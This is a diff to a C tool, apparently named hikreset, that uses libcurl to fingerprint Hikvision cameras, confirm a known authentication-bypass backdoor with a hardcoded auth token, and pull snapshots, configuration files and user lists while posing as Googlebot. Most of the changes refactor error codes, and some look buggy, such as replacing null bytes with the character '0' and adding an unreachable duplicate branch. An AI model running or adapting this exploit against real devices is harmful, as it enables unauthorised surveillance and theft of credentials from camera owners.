@@ -3,10 +3,10 @@
 #endif
 #include <curl/curl.h>
 #include <stdlib.h>
-#include "hikreset.h"
 #include <stdio.h>
 #include <string.h>
 #include <errno.h>
+#include "hikreset.h"
 
 
 static size_t
@@ -35,7 +35,7 @@ deleteNullBytes(char *p, size_t i){
 	//i - size of str *p
 	for(int k=0;k<=(int)(i-1);k++)
 		if (p[k]=='\0')
-			p[k]=0;
+			p[k]='0';
 }
 
 int hikvisionCheck(char *ip){
@@ -64,11 +64,11 @@ int hikvisionCheck(char *ip){
 		res = curl_easy_perform(curl);
 
 		if(res != CURLE_OK){
-			fprintf(stderr, "%s - curl_easy_perform() failed: %s\n",ip,
+			fprintf(stderr, "%s - curl_easy_perform() failed: %s\n",ip, 
 				curl_easy_strerror(res));
 			curl_easy_cleanup(curl);
 			free(url);
-			return -4;
+			return EASYPERFORMERR;
 		}
 
 		curl_easy_cleanup(curl);
@@ -77,7 +77,7 @@ int hikvisionCheck(char *ip){
 		p = (char *)realloc(chunk.memory, chunk.size+1);
 		if (!p){
 			fprintf(stderr, "Not enough memory!\n");
-			return -2;
+			return NOTENOUGHTMEMORY;
 		}
 		chunk.memory=p;
 		chunk.size++;
@@ -90,15 +90,14 @@ int hikvisionCheck(char *ip){
 		if (comp)
 			return 1;
 		else
-			return 0;
+			return NOTHIKVISIONERR;
 
 	}else{
-		return -1;
+		return CURLINITERR;
 	}
 }
 
 int backdoorCheck(char *ip){
-	
 	int hikvisionCheckResult = hikvisionCheck(ip);
 	if(hikvisionCheckResult==1){
 		CURL *curl;
@@ -123,7 +122,7 @@ int backdoorCheck(char *ip){
 				fprintf(stderr, "%s - curl_easy_perform() failed: %s\n", ip,
 					curl_easy_strerror(res));
 				curl_easy_cleanup(curl);
-				return -4;
+				return EASYPERFORMERR;
 			}
 			long http_code = 0;
 
@@ -131,17 +130,12 @@ int backdoorCheck(char *ip){
 			curl_easy_cleanup(curl);
 			free(url);
 			if(http_code == 200) return 1;
-			else return 0;
+			else return NOTVULNERABLE;
 		}
 		else{
-			return -3;
+			return CURLINITERR;
 		}
-	}else if(hikvisionCheckResult==0){
-		fprintf(stderr, "%s - not a Hikvision device.\n", ip);
-		return -1;
-	}
-	else  if (hikvisionCheckResult == -4) return -4;
-	else return 0;
+	}else return hikvisionCheckResult;
 
 }
 
@@ -150,8 +144,8 @@ int download(char *ip, enum downloadFile filetype, FILE* fd){
 	CURLcode res;
 	curl = curl_easy_init();
 	char* url;
-
-	if (backdoorCheck(ip)==1){
+	int checked = backdoorCheck(ip);
+	if (checked == 1){
 		if (filetype==SNAPSHOT){
 			asprintf(&url,"%s%s",ip,"/onvif-http/snapshot?auth=YWRtaW46MTEK");
 		}
@@ -159,7 +153,7 @@ int download(char *ip, enum downloadFile filetype, FILE* fd){
 			asprintf(&url,"%s%s",ip,"/System/configurationFile?auth=YWRtaW46MTEK");
 		}
 		else {
-			return -1;
+			return EINVAL;
 		}
 		if(curl) {
 			
@@ -174,7 +168,7 @@ int download(char *ip, enum downloadFile filetype, FILE* fd){
 			if(res != CURLE_OK){
 				fprintf(stderr, "%s, curl_easy_perform() failed: %s\n",ip,
 					curl_easy_strerror(res));
-				return -4;
+				return EASYPERFORMERR;
 			}
 			long http_code = 0;
 
@@ -185,16 +179,19 @@ int download(char *ip, enum downloadFile filetype, FILE* fd){
 			return http_code;
 		}
 		else{
-			return -2;
+			return CURLINITERR;
 		}
 	}
-	else{
-		fprintf(stderr, "%s - Not a Hikvision device, or device w/o Backdoor.\n",ip);
-		return -3;
-	}
+	else if (checked == NOTENOUGHTMEMORY)
+		fprintf(stderr, "%s - Not enough memory.",ip);
+	else if (checked == NOTHIKVISIONERR)
+		fprintf(stderr, "%s - Not a Hikvision device.",ip);
+	else if (checked == CURLINITERR)
+		fprintf(stderr, "%s - error while cURL init.",ip);
+	return checked;
 }
 
-void getUsers(char *ip){
+int getUsers(char *ip){
 	int checked = backdoorCheck(ip);
 	if(checked==1){
 		CURL *curl;
@@ -209,13 +206,23 @@ void getUsers(char *ip){
 			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
 			res = curl_easy_perform(curl);
 
-			if(res != CURLE_OK)
+			if(res != CURLE_OK){
 				fprintf(stderr, "curl_easy_perform() failed: %s\n",
 					curl_easy_strerror(res));
+				return EASYPERFORMERR;
+			}
 			curl_easy_cleanup(curl);
 			free(url);
 		}
+		else return CURLINITERR;
 	}
-	else if (checked == -3) printf("Something went wrong during curl init.\n");
-	else printf("%s - Backdoor not confirmed.\n", ip);
+	else if (checked == CURLINITERR)
+		printf("Something went wrong during curl init.\n");
+	else if (checked == NOTENOUGHTMEMORY)
+		fprintf(stderr, "%s - Not enough memory.",ip);
+	else if (checked == NOTHIKVISIONERR)
+		fprintf(stderr, "%s - Not a Hikvision device.",ip);
+	else if (checked == CURLINITERR)
+		fprintf(stderr, "%s - error while cURL init.",ip);
+	return checked;
 }
